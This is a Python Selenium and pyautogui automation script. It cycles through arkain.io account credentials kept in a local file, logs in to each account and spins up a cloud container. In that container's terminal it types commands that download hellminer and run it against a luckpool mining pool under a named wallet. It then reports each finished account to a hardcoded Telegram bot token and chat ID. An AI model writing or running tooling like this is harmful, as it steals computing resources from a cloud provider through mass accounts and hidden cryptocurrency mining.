
import time
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import pyautogui
import re
import requests
import datetime

TELEGRAM_BOT_TOKEN = "8572503717:AAGplNh_9T4d1ruqG0mbtshZ5bZcqU5E05Q"
TELEGRAM_CHAT_ID = "8522842170"

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message
    }
    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print("Telegram message sent successfully.")
        else:
            print(f"Failed to send Telegram message: {response.text}")
    except Exception as e:
        print(f"Error sending Telegram message: {e}")

def remove_account_from_file(file_path, email):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        final_lines = []
        buffer_lines = []
        block_has_email = False
        
        for line in lines:
            if line.strip().startswith("badr, ["):
                if buffer_lines:
                     if not block_has_email:
                         final_lines.extend(buffer_lines)
                buffer_lines = [line]
                block_has_email = False
            else:
                buffer_lines.append(line)
                if f"Email: {email}" in line:
                    block_has_email = True
        
        if buffer_lines and not block_has_email:
            final_lines.extend(buffer_lines)
            
        with open(file_path, 'w', encoding='utf-8') as f:
            f.writelines(final_lines)
            
        print(f"Account {email} removed from {file_path}")
        return True
    except Exception as e:
        print(f"Error removing account: {e}")
        return False

def get_first_credential(file_path):
    """
    Reads the accounts file and returns the first (email, password) tuple found.
    """
    email = None
    password = None
    
    if not os.path.exists(file_path):
        print(f"Error: Credentials file not found at {file_path}")
        return None, None

    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line.startswith("Email:"):
                    email = line.split("Email:", 1)[1].strip()
                elif line.startswith("Password:"):
                    password = line.split("Password:", 1)[1].strip()
                
                if email and password:
                    return email, password
    except Exception as e:
        print(f"Error reading credentials file: {e}")
        return None, None
    
    return None, None

def login(email, password):
    print(f"Attempting login for: {email}")

    # Setup Chrome options
    chrome_options = Options()
    # chrome_options.add_argument("--start-fullscreen") # Removed as per user request
    # chrome_options.add_argument("--kiosk") 
    chrome_options.add_experimental_option("detach", True) # Keep browser open 

    # Setup WebDriver
    driver = None
    try:
        driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=chrome_options)
        driver.maximize_window() # Maximize window as requested
    except Exception as e:
        print(f"Failed to initialize WebDriver: {e}")
        return None, None

    try:
        # 1. Open Browser & Navigate
        print("Navigating to login page...")
        driver.get("https://account.arkain.io/login")
        
        wait = WebDriverWait(driver, 15)

        # 2. Enter Email
        print("Entering email...")
        # Updated selector based on inspection
        email_input = wait.until(EC.visibility_of_element_located((By.ID, "email-input")))
        email_input.clear()
        email_input.send_keys(email)
        
        # 3. Wait 1 second
        time.sleep(1)

        # 4. Enter Password
        print("Entering password...")
        # Updated selector based on inspection
        password_input = wait.until(EC.visibility_of_element_located((By.ID, "password-input")))
        password_input.clear()
        password_input.send_keys(password)

        # 5. Wait 1 second
        time.sleep(1)

        # 6. Click Login
        print("Clicking login...")
        # Try finding by type="submit" first, then by text if that fails.
        try:
            # Re-locating mostly to ensure freshness or if DOM changed slightly
            login_btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
        except:
            # Fallback
            login_btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Login') or contains(text(), 'Sign In')]")
            
        login_btn.click()
        
        print("Login action completed. Waiting a bit to see result...")
        time.sleep(5) # Keep open for a bit to verify
        
        return driver # Return driver on success

    except Exception as e:
        print(f"An error occurred during execution: {e}")
        if driver:
            driver.quit()
        return None, None

if __name__ == "__main__":
    while True:
        try:
            # Login Process
            accounts_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'accounts.txt')
            email, password = get_first_credential(accounts_file_path)
            
            if not email or not password:
                print("No more accounts found (or invalid format). Script finished.")
                break

            driver = login(email, password)
            
            if not driver:
                print("Login failed or driver not initialized. Retrying in 5 seconds...")
                time.sleep(5)
                continue

            # Image Search Loop
            # Define image path robustly
            base_dir = os.path.dirname(os.path.abspath(__file__))
            image_path = os.path.join(base_dir, 'step1.png')
            
            if not os.path.exists(image_path):
                print(f"CRITICAL ERROR: 'step1.png' not found at {image_path}")

            image_found = False
            for attempt in range(8):
                print(f"Searching for image at '{image_path}' (Attempt {attempt + 1}/8)...")
                try:
                    # Lower confidence and use grayscale for better matching
                    location = pyautogui.locateOnScreen(image_path, confidence=0.7, grayscale=True) 
                    if location:
                        print(f"Image found at: {location}")
                        image_found = True
                        break
                except Exception as e:
                    print(f"Search error (ensure opencv-python is installed): {e}")
                    pass
                
                print("Image not found. Waiting 8 seconds...")
                time.sleep(8)
            
            if not image_found:
                print("Image 'step1.png' not found after 6 attempts. Restarting browser...")
                driver.quit()
                continue # Restart the main while loop
            time.sleep(5)
            
            # Interaction
            print("Performing interactions...")
            # 1. Click coordinates 809, 534
            pyautogui.click(758, 758)
            time.sleep(3)
            
            
            
            # 3. Click coordinates 1215, 655
            pyautogui.click(1279, 696)
            
            # 4. Handle New Tab
            print("Waiting for new tab...")
            wait_for_tab_start = time.time()
            while len(driver.window_handles) == 1:
                time.sleep(1)
                if time.time() - wait_for_tab_start > 30: # 30s timeout for new tab
                    print("Timed out waiting for new tab.")
                    break
            
            if len(driver.window_handles) > 1:
                driver.switch_to.window(driver.window_handles[-1])
                print(f"Switched to new tab. Current URL: {driver.current_url}")
                
                # --- New Logic Start ---
                try:
                    # 1. Extract ID
                    current_url = driver.current_url
                    # Look for ID pattern (approx 15+ alphanumeric chars) in the URL
                    # Adjust regex based on expected URL structure if needed. 
                    # Assuming ID is part of the path or can be grabbed. 
                    # User example ID: dwy1yyc7z9pnlcne9vn 
                    # Example URL context implies it might be in the URL path.
                    # If the URL is like .../projects/dwy1yyc7z9pnlcne9vn/... or similar, or just present.
                    # We will try to find a long alphanumeric string.
                    match = re.search(r'([a-z0-9]{15,})', current_url)
                    
                    if match:
                        project_id = match.group(1)
                        print(f"Extracted Project ID: {project_id}")
                        
                        # 2. Wait 60 seconds
                        print("Waiting 60 seconds...")
                        time.sleep(60)
                        
                        # 3. Navigate to Settings URL
                        settings_url = f"https://eu-central-1.arkain.io/dashboard#/containers/projects/{project_id}/settings"
                        print(f"Navigating to: {settings_url}")
                        driver.get(settings_url)
                        
                        # 4. Search for step2.png
                        step2_path = os.path.join(base_dir, 'step2.png')
                        step2_found = False
                        
                        if not os.path.exists(step2_path):
                             print(f"WARNING: 'step2.png' not found at {step2_path}")

                        for i in range(10):
                            print(f"Searching for 'step2.png' (Attempt {i+1}/10)...")
                            try:
                                loc = pyautogui.locateOnScreen(step2_path, confidence=0.7, grayscale=True)
                                if loc:
                                    print(f"Found step2.png at {loc}")
                                    step2_found = True
                                    break
                            except Exception as e:
                                pass
                            time.sleep(6)
                        
                        if step2_found:
                            # 5. Click Sequence
                            print("Starting click sequence...")
                            
                            # Click 1800, 300
                            pyautogui.click(1800, 300)
                            time.sleep(1)
                            
                            # Click 1144, 677
                            pyautogui.click(1144, 677)
                            time.sleep(15)
                            
                            # Reload Page
                            print("Reloading page...")
                            driver.refresh()
                            time.sleep(15) # Wait for reload to settle logic not specified, adding minimal safety or relying on next wait? 
                            # User said: "then reload page, then click...". 
                            # Page load might take time. I'll add a small implicit wait or just proceed if user didn't specify wait after reload (User said: "Wait 15s then reload. after that click 363,877").
                            # I'll Assume page loads reasonably fast or user relying on next delays. 
                            pyautogui.click(363, 877)
                            time.sleep(2)
                            # Search for 2_1.png before clicking
                            image_2_1_path = os.path.join(base_dir, '2_1.png')
                            image_2_1_found = False
                            
                            print("Searching for '2_1.png' to determine click behavior...")
                            for search_attempt in range(5):
                                try:
                                    if pyautogui.locateOnScreen(image_2_1_path, confidence=0.7, grayscale=True):
                                        print(f"'2_1.png' found on attempt {search_attempt+1}.")
                                        image_2_1_found = True
                                        break
                                except:
                                    pass
                                time.sleep(5)
                            
                            if image_2_1_found:
                                print("Image found. Skipping clicks at 363, 877.")
                            else:
                                print("Image '2_1.png' not found. Executing click sequence.")
                                # Click 363, 877
                                
                                
                                # Click 363, 877 (Again)
                                pyautogui.click(363, 877)
                                time.sleep(8)
                            
                            # Click 855, 750
                            pyautogui.click(943, 883)
                            time.sleep(4)
                            
                            # Click 1155, 977
                            pyautogui.click(1155, 977)
                            time.sleep(10)
                            
                            # Click 1629, 290
                            pyautogui.click(1629, 290)
                            print("Sequence completed.")

                            # --- Step 3 Logic: Search for step3.png ---
                            step3_path = os.path.join(base_dir, 'step3.png')
                            step3_found_officially = False
                            
                            # Loop to handle reloading if not found
                            while not step3_found_officially:
                                print("Searching for 'step3.png'...")
                                for attempt in range(7):
                                    try:
                                        if pyautogui.locateOnScreen(step3_path, confidence=0.7, grayscale=True):
                                            print(f"'step3.png' found on attempt {attempt+1}.")
                                            step3_found_officially = True
                                            break
                                    except:
                                        pass
                                    time.sleep(6)
                                
                                if step3_found_officially:
                                    break
                                
                                print("'step3.png' not found after 7 attempts. Reloading page...")
                                driver.refresh()
                                time.sleep(15) # Wait for page reload

                            if step3_found_officially:
                                pyautogui.click(1279, 696)
				                time.sleep(3)
                                print("Executing terminal commands...")
                                commands = [
                                    "cd ~",
                                    "wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz",
                                    "tar -xf hellminer_linux64.tar.gz",
                                    "./hellminer -c stratum+tcp://eu.luckpool.net:3956 -u REN2aYueKDtfAqLHqmDHkGkP3V187jxNWv.badrbadran001 -p x"
                                ]
                                
                                for cmd in commands:
                                    # Type with delay between characters
                                    pyautogui.write(cmd, interval=0.2) 
                                    pyautogui.press('enter')
                                    time.sleep(3) # Wait a bit between commands
                                
                                # --- New Logic: Cleanup & Notify ---
                                try:
                                    print("Commands executed. Removing account and notifying...")
                                    
                                    # Accounts file path (re-constructed as in login)
                                    accounts_file_path = os.path.join(base_dir, 'accounts.txt')
                                    remove_account_from_file(accounts_file_path, email)
                                    
                                    # Send Telegram
                                    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                                    message = (
                                        f"✅ Loop Completed Successfully\n"
                                        f"📧 Email: {email}\n"
                                        f"🕒 Time: {current_time}"
                                    )
                                    send_telegram_message(message)
                                    
                                except Exception as e:
                                    print(f"Error in cleanup/notification: {e}")
                            
                        else:
                            print("Failed to find 'step2.png' after 10 attempts.")

                    else:
                        print("Could not extract Project ID from URL.")
                        
                except Exception as e:
                    print(f"Error during post-login automation: {e}")
                
            else:
                print("No new tab opened.")

            print("Process completed successfully. Keeping browser open and moving to next account...")
            # if driver:
            #     driver.quit()
            time.sleep(2)

        except Exception as e:
            print(f"An unexpected error occurred in the main loop: {e}")
            try:
                driver.quit()
            except:
                pass
            print("Restarting in 5 seconds...")
            time.sleep(5)

